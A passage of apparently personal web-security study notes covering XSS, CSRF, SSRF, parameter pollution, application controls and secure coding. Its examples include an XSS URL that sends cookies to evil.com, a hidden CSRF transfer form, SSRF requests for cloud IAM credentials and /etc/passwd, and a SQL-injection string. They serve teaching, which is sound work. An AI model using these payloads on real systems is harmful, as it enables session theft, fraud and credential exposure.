+  <a class="anchor" href="#exploiting-web-application-vulnerabilities">#</a>
+  
+</h2>
+<ul>
+<li><strong>Cross-Site Scripting XSS</strong> - when an attacker does HTML injection (inject their own HTML into a webpage)
+<ul>
+<li><strong>Reflected XSS</strong>
+<ul>
+<li>When an application allows <em>&ldquo;reflected input&rdquo;</em></li>
+<li>Anywhere, where a user can provide &ldquo;input&rdquo; that later would be viewed by another user there is a XSS oppertunity.</li>
+<li>Example <code>https://news.com/search.php?q=&lt;script&gt;document.location='https://evil.com/steal?cookie='+document.cookie&lt;/script&gt;</code> assuming that the search page would (without validation) render the search query <code>q</code> in the html (<code>Search results for q</code>.)</li>
+</ul>
+</li>
+<li><strong>Stored/Persistent XSS</strong>
+<ul>
+<li>Here the XSS script is stored server/side</li>
+<li>Example: I leave a product review with content <code>Good product! &lt;script&gt;alert('oi')&lt;/script&gt;</code>
+<ul>
+<li>If this input is not sanatized or cleaned, it will store this string in the database.</li>
+<li>When someone else views the product, and all comments are rendered underneath, the <code>&lt;script&gt;alert('oi')&lt;/script&gt;</code> part will be seen as actual HTML and the script tag will execute.</li>
+<li>Now you can replace <code>alert('oi')</code> with javascript that will log your keys, steal your cookies, etc&hellip; cause you are now runng a script under the domain of the trusted site.</li>
+</ul>
+</li>
+<li>⚠️ Think of other ways where you can &ldquo;inject HTML&rdquo; on the request route or from a browser plugin.</li>
+<li>Solutions
+<ul>
+<li>Input validation and escaping</li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html">OWASP Cheatsheet</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>Request Forgery</strong>
+<ul>
+<li>Exploit trust relationships and try users to unwittingly execute commands against a remote server, there are 2 types.</li>
+<li><strong>Cross-Site Request Forgery CSRF/XSRF</strong>
+<ul>
+<li>Assume you are logged in to <code>mybank.com</code>.</li>
+<li>You then visit a dangerous site or link <code>evil.com</code></li>
+<li>When you click on a button on <code>evil.com</code> it might trigger a request to <code>mybank.com</code></li>
+<li>If you are stil loggedin to <code>mybank.com</code>, the request could succeed because the browser would use any cookies linked to the <code>mybank.com</code> site.</li>
+<li>Example HTMl on the <code>evil.com</code> site</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>    <span style="color:#75715e">&lt;!-- Hidden on evilsite.com --&gt;</span>
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://somebank.com/transfer&#34;</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;POST&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;malicious-form&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;to_account&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;999999&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;amount&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;5000&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">&lt;!-- Note: no CSRF token! --&gt;</span>
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">form</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Automatically submit when page loads
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e">// document.getElementById(&#39;malicious-form&#39;).submit();
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    &lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><ul>
+<li>Defenses: secure tokens, check in reffering url to only accept urls that originate from own domain.</li>
+</ul>
+</li>
+<li><strong>Server-Side Request Forgery SSRF</strong>
+<ul>
+<li>Here we want the server/back-end to make an web call to a url.</li>
+<li>Let&rsquo;s say you have a web application that takes an URL as input</li>
+<li>That URL would be used to fetch remote information, and it would return that in some form.</li>
+<li>Imagine for that URL, you specifcy a URL or IP address that would be not publicly available, but only to your back-end server</li>
+<li>Example: <code>GET /preview?url=http://localhost:8080/admin/users</code></li>
+<li>Example: <code>GET /preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/</code> on AWS exposes IAM credentials</li>
+<li>Example: <code>GET /preview?url=file:///etc/passwd</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="application-security-controls">
+  Application Security Controls
+  
+  <a class="anchor" href="#application-security-controls">#</a>
+  
+</h2>
+<ul>
+<li><strong>Input Validation</strong>
+<ul>
+<li>Protects agains Injection attackes, XSS, XSRF, SSRF and many more.</li>
+<li>Best method: Allow Listing
+<ul>
+<li>When you expect an age, only allow values between 0 - 125, anything else get rejected.</li>
+<li>Remember, always test at least server side.</li>
+</ul>
+</li>
+<li>Next best method: Deny Listing (Cause often describing only what is allow is to wide)
+<ul>
+<li>Look and block for SQL code, HTML tags, etc..</li>
+</ul>
+</li>
+<li>Parameter Pollution - a trick attackers try to get around input validatio/filtering
+<ul>
+<li>Example <code>www.example.com/status?account=1&amp;account=1' or 1=1;--</code>
+<ul>
+<li>Here the hope is that validiation only happens on the first specification of the parameter, but not the second.</li>
+<li>This behaviour is very tech specific (PHP, ExpressJS, ASP, Python Flask,&hellip;.) so the hack really depends on the web server stack.</li>
+<li>Example : Authentication Bypass - it might take the right passwor for user <code>guest</code> but think it was user <code>admin</code></li>
+</ul>
+<pre tabindex="0"><code>POST /login
+user=admin&amp;pass=wrong&amp;user=guest&amp;pass=correct
+</code></pre><ul>
+<li>Example : Rate Limiting bypass</li>
+</ul>
+<pre tabindex="0"><code>GET /api/data?user_id=victim&amp;user_id=attacker
+</code></pre></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>Web Application Firewalls (WAFS)</strong>
+<ul>
+<li>A WAF sits in front of the actual web server and acts like a firewall but on application level. It can inspect requests and intercept/filter anything suspicious, which would be another layer of security, hopefully blocking this that the eventual backend is not handling.</li>
+<li>Note that the client has a TLS connection to the WAF, so the WAF can inspect all traffic, but then forwads the request as a new TLS connection to the origins server.</li>
+</ul>
+</li>
+<li><strong>Parameterized Queries</strong>
+<ul>
+<li>Input is not put directly into the SQL string, but parameterized, this way the entire input data is pure data, not a part of the SQL text. So it&rsquo;s uses as a literal string. Unescapable (is the theory)</li>
+</ul>
+</li>
+<li><strong>Sandboxing</strong>
+<ul>
+<li>Run app in a controlled or isolated environment, preventing interaction with surroundings.</li>
+</ul>
+</li>
+<li><strong>Code Security</strong>
+<ul>
+<li>Securing the code itself</li>
+<li><em>Code Signing</em> - Sign code by devs to confirm authencity (PGP signature for example)</li>
+<li><em>Code Reuse</em> - Monitor and mainting even higher standards for reused code (e.g. SDKs)</li>
+<li><em>Software Diversity</em> - Watch for single points of failuree</li>
+<li><em>Code Repositories</em> - versioning and history is great for audit</li>
+<li><em>Integrity Measurement</em> - Make sure that approved code its hash matches to the hash being deployed</li>
+<li><em>Application Resilience</em> - through 2 ways
+<ul>
+<li>Scalability - designed so extra resources can be added</li>
+<li>Elasticty - a step further, it provisions extra resources when it needs it</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="secure-coding-practices">
+  Secure Coding Practices
+  
+  <a class="anchor" href="#secure-coding-practices">#</a>
+  
+</h2>
+<ul>
+<li><strong>Source Handling Comments</strong> - Remove code comments in production code (for the non compiled code, like JS)</li>
+<li><strong>Error Handling</strong> - Be cautious that error messages dont give to much detail, no debug mode in prod!</li>
+<li><strong>Hard-Coded Credentials</strong>
+<ul>
+<li>Well intentioned backdoor - Once the credentials are known, any deployed version is at risk</li>
+<li>Non intentioned - API keys etc..</li>
+</ul>
+</li>
+<li><strong>Package Monitoring</strong> - Monitor your dependencies and packages,</li>
+<li><strong>Memory Management</strong>
+<ul>
+<li><em>Resource Exhaustion</em> - Can make the application crash (e.g. memory leak)</li>
+<li><em>Pointer Deference</em> - Memory Pointers, when a pointer points to a memory spot with unkown value it can crash or worst case bypass validation</li>
+<li><em>Buffer Overflows</em> - Attack tricks the app to handle more data then it has assigned.
+<ul>
+<li>Memory Injection: Goal is to overwrite memory with instructions that might be executed by another process running on the system</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>Race Conditions</strong>
+<ul>
+<li>When Security of the code depends upon a sequence of events within the system
+<ul>
+<li><em>Time-Of-Check (TOC)</em> - When a system verifies access permissions or other security controls.</li>
+<li><em>Time-Of-Use (TOU)</em> - When the system access the resources or permission that was granted.</li>
+<li><em>Target of Evaluation (TOE)</em> - refers to component/system being evaluated or tested for potential vulnerabilities.</li>
+<li><em>TIme-Of-Check-To-Time-Of-Use</em> issue is a race condition when the app checks the permission too far ahead of a resource request.</li>
+<li>Example: If an attacker logs in and has <code>admin</code> rights via a web interface, leaves that session open for a day, but within a hour his <code>admin</code> rights are taken away, this change might not be observed yet everywhere, cause a session is open and permissions were already evaluated.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>Unprotected APIs</strong>
+<ul>
+<li>APIs should be authenticated and make sure that at every endpoint AutH and AuthZ is happening.</li>
+</ul>
+</li>
+</ul>
+<h2 id="automation-and-orchestration">
+  Automation and Orchestration
+  
+  <a class="anchor" href="#automation-and-orchestration">#</a>
+  
+</h2>
+<p>SOAR: Security Orchestration, Automation, and response platforms.</p>
+<p>Automation can remove human error and make security easier and more scaleable.</p>
+<ul>
+<li><strong>Use Cases of Autmation and Scripting</strong>
+<ul>
+<li>Examples: User provisioning, resource provisioning, guard rails, security groups, ticket creation, escalation, enabled/disabling services and access, CI &amp; testing, Integrations and APIs
+<ul>
+<li>Guard Rails: Enforce policy controls and prevent violations of security protocols</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>Benefits of Automation and Scripting</strong>
+<ul>
+<li>Less chance for human error</li>
+<li>Consistency in how things are done</li>
+<li>Standerization</li>
+<li>Scale in secure manner</li>
+<li>Speed up</li>
+</ul>
+</li>
+<li><strong>Other Considerations</strong>
+<ul>
+<li>Complexity, Cost, Single point of failure, Technical Debt, Ongoing supportability</li>
+</ul>
+</li>
+</ul>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+
+
+
+
+</div>
+
+
+
+
+
+  
+  
+  
+  <div class="flex flex-wrap justify-between">
+    <span>
+    
+      <a href="/cybersecurity/" class="flex align-center">
+        <img src="/svg/backward.svg" class="book-icon" alt="Previous" title="Cybersecurity" />
+        <span>Cybersecurity</span>
+      </a>
+    
+    </span>
+    <span>
+    
+      <a href="/cybersecurity/cloud-and-virtualization-security/" class="flex align-center">
+        <span>Cloud and Virtualization Security</span>
+        <img src="/svg/forward.svg" class="book-icon" alt="Next" title="Cloud and Virtualization Security" />
+      </a>
+    
+    </span>
+  </div>
+  
+
+
+
+
+  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+
+
+ 
+        
+      </footer>
+
+      
+  
+  <div class="book-comments">
+
+</div>
+  
+ 
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+
+<aside class="book-toc">
+  <div class="book-toc-content">
+    
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#software-assurance-best-practices">Software Assurance Best Practices</a></li>
+    <li><a href="#designing-and-coding-for-security">Designing and Coding For Security</a></li>
+    <li><a href="#software-security-testing">Software Security Testing</a></li>
+    <li><a href="#injection-vulnerabilitiies">Injection Vulnerabilitiies</a></li>
+    <li><a href="#exploiting-authentication-vulnerabilities">Exploiting Authentication Vulnerabilities</a></li>
+    <li><a href="#exploiting-authorization-vulnerabilities">Exploiting Authorization Vulnerabilities</a></li>
+    <li><a href="#exploiting-web-application-vulnerabilities">Exploiting Web Application Vulnerabilities</a></li>
+    <li><a href="#application-security-controls">Application Security Controls</a></li>
+    <li><a href="#secure-coding-practices">Secure Coding Practices</a></li>
+    <li><a href="#automation-and-orchestration">Automation and Orchestration</a></li>
+  </ul>
+</nav>
+
+
+
+  </div>
+</aside>
+
+ 
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
